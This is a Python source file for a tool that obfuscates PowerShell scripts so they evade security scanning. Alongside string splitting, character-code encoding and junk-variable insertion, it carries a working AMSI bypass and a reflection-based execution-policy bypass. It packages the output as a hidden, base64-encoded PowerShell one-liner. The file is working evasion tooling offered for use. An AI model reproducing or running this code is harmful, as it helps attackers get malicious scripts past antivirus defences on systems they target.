#!/usr/bin/env python3
"""
PowerShell Script Obfuscator
Author: l0c0b0b0
Description: Applies multiple obfuscation techniques to PowerShell scripts
"""

import argparse
import random
import string
import base64
import re
from typing import List, Tuple, Dict

class PowerShellObfuscator:
    def __init__(self):
        self.var_pool = []
        self.used_names = set()
        self.techniques = [
            self._string_splitting_index,
            self._ascii_char_conversion,
            self._dynamic_invocation,
            self._variable_reuse
        ]

    def _generate_random_var(self) -> str:
        """Generate random variable name that hasn't been used yet"""
        while True:
            length = random.randint(4, 12)
            var_name = '$' + ''.join(random.choice(string.ascii_letters) for _ in range(length))
            if var_name not in self.used_names:
                self.used_names.add(var_name)
                return var_name

    def _string_splitting_index(self, code: str) -> str:
        """Technique 1: String splitting and index obfuscation"""
        lines = code.split('\n')
        obfuscated_lines = []

        for line in lines:
            if not line.strip() or line.strip().startswith('#'):
                obfuscated_lines.append(line)
                continue

            strings = re.findall(r'\"([^\"]*)\"', line)
            if not strings:
                obfuscated_lines.append(line)
                continue

            for s in strings:
                var_name = self._generate_random_var()
                self.var_pool.append((var_name, s))

                # Split string into parts
                parts = [s[i:i+2] for i in range(0, len(s), 2)]
                parts_var = self._generate_random_var()
                #parts_code = f"{parts_var}=@({','.join([f'\"{p}\"' for p in parts])});"
                quoted_parts = []
                for p in parts:
                    quoted_parts.append(f'"{p}"')  # Or '\"{p}\"' if you prefer the escaped quote style

                joined_parts = ",".join(quoted_parts)
                parts_code = f"{parts_var}=@({joined_parts});"



                # Reconstruct with -join
                reconstruct_code = f"{var_name}=({parts_var} -join '');"

                line = line.replace(f'"{s}"', var_name)
                line = parts_code + reconstruct_code + line

            obfuscated_lines.append(line)

        return '\n'.join(obfuscated_lines)

    def _ascii_char_conversion(self, code: str) -> str:
        """Technique 2: ASCII-to-char conversion"""
        lines = code.split('\n')
        obfuscated_lines = []

        for line in lines:
            if not line.strip() or line.strip().startswith('#'):
                obfuscated_lines.append(line)
                continue


            strings = re.findall(r'\"([^\"]*)\"', line)
            if not strings:
                obfuscated_lines.append(line)
                continue

            for s in strings:
                if len(s) < 3:  # Not worth obfuscating short strings
                    continue

                var_name = self._generate_random_var()
                self.var_pool.append((var_name, s))

                # Convert to ASCII codes
                ascii_codes = [str(ord(c)) for c in s]
                ascii_var = self._generate_random_var()
                ascii_code = f"{ascii_var}=@({','.join(ascii_codes)});"

                # Convert back to chars
                char_code = f"{var_name}=[string]::join('',({ascii_var}|%{{[char]$_}}));"

                line = line.replace(f'"{s}"', var_name)
                line = ascii_code + char_code + line

            obfuscated_lines.append(line)

        return '\n'.join(obfuscated_lines)

    def _dynamic_invocation(self, code: str) -> str:
        """Technique 3: Dynamic invocation"""
        lines = code.split('\n')
        obfuscated_lines = []

        for line in lines:
            if not line.strip() or line.strip().startswith('#') or '=' in line:
                obfuscated_lines.append(line)
                continue

            # Find commands to obfuscate
            commands = re.findall(r'^\s*([a-zA-Z-]+)\s', line)
            if not commands:
                obfuscated_lines.append(line)
                continue

            cmd = commands[0]
            var_name = self._generate_random_var()
            self.var_pool.append((var_name, cmd))

            # Create invocation
            new_line = line.replace(cmd, f"& {var_name}", 1)
            new_line = f"{var_name}=\"{cmd}\";{new_line}"

            obfuscated_lines.append(new_line)

        return '\n'.join(obfuscated_lines)

    def _variable_reuse(self, code: str) -> str:
        """Technique 4: Variable reuse and garbage insertion"""
        # Add garbage variables
        garbage_lines = []
        for _ in range(random.randint(3, 7)):
            var_name = self._generate_random_var()
            garbage_value = ''.join(random.choice(string.ascii_letters) for _ in range(random.randint(5, 15)))
            garbage_lines.append(f"{var_name}=\"{garbage_value}\";")

        # Insert garbage at random positions
        lines = code.split('\n')
        for i in range(len(lines)):
            if random.random() > 0.7 and lines[i].strip():
                lines[i] = random.choice(garbage_lines) + lines[i]

        return '\n'.join(lines)

    def _add_amsi_bypass(self, code: str) -> str:
        """Technique 5: AMSI bypass"""
        amsi_bypass = """
# AMSI Bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
"""
        return amsi_bypass + code

    def _add_signature_bypass(self, code: str) -> str:
        """Technique 6: Signature bypass"""
        signature_bypass = """
# Bypass execution policy
function Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield("_context","nonpublic,instance").getvalue( $executioncontext)).gettype().getfield("_authorizationManager","nonpublic,instance").setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager "Microsoft.PowerShell"))}
Disable-ExecutionPolicy
"""
        return signature_bypass + code

    def _add_network_artifacts(self, code: str) -> str:
        """Technique 7: Network artifacts"""
        network_artifacts = """
# Network artifacts removal
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ProgressPreference = 'SilentlyContinue'
"""
        return network_artifacts + code

    def _encode_base64(self, code: str) -> str:
        """Encode entire script as base64 for one-liner"""
        encoded = base64.b64encode(code.encode('utf-16le')).decode('utf-8')
        return f"powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {encoded}"

    def obfuscate(self, code: str, techniques: List[str], output_format: str) -> str:
        """Apply selected obfuscation techniques"""
        # Apply core techniques
        if 'string_split' in techniques:
            code = self._string_splitting_index(code)
        if 'ascii_char' in techniques:
            code = self._ascii_char_conversion(code)
        if 'dynamic_invoke' in techniques:
            code = self._dynamic_invocation(code)
        if 'variable_reuse' in techniques:
            code = self._variable_reuse(code)

        # Apply bypass techniques
        if 'amsi_bypass' in techniques:
            code = self._add_amsi_bypass(code)
        if 'signature_bypass' in techniques:
            code = self._add_signature_bypass(code)
        if 'network_artifacts' in techniques:
            code = self._add_network_artifacts(code)

        # Format output
        if output_format == 'oneliner':
            return self._encode_base64(code)
        return code

def main():
    parser = argparse.ArgumentParser(
        description="PowerShell Script Obfuscator",
        formatter_class=argparse.RawTextHelpFormatter
    )

    parser.add_argument(
        '-i', '--input',
        required=True,
        help='Input PowerShell script file'
    )

    parser.add_argument(
        '-o', '--output',
        required=True,
        help='Output file for obfuscated script'
    )

    parser.add_argument(
        '-t', '--techniques',
        nargs='+',
        choices=[
            'string_split', 'ascii_char', 'dynamic_invoke', 'variable_reuse',
            'amsi_bypass', 'signature_bypass', 'network_artifacts', 'all'
        ],
        default=['all'],
        help="""Obfuscation techniques to apply:
  string_split    - String splitting & index obfuscation
  ascii_char      - ASCII-to-char conversion
  dynamic_invoke  - Dynamic Invocation (&)
  variable_reuse  - Variable reuse
  amsi_bypass     - AMSI Bypass
  signature_bypass - Signature bypass
  network_artifacts - Network Artifacts
  all             - All techniques combined"""
    )

    parser.add_argument(
        '-f', '--format',
        choices=['script', 'oneliner'],
        default='script',
        help='Output format: script (normal .ps1 file) or oneliner (base64 encoded one-liner)'
    )

    args = parser.parse_args()

    # Handle 'all' option
    if 'all' in args.techniques:
        args.techniques = [
            'string_split', 'ascii_char', 'dynamic_invoke', 'variable_reuse',
            'amsi_bypass', 'signature_bypass', 'network_artifacts'
        ]

    try:
        with open(args.input, 'r', encoding='utf-8') as f:
            ps_code = f.read()

        obfuscator = PowerShellObfuscator()
        obfuscated_code = obfuscator.obfuscate(ps_code, args.techniques, args.format)

        with open(args.output, 'w', encoding='utf-8') as f:
            f.write(obfuscated_code)

        print(f"[+] Obfuscation completed successfully. Output saved to {args.output}")

    except Exception as e:
        print(f"[-] Error: {str(e)}")
        exit(1)

if __name__ == '__main__':
    main()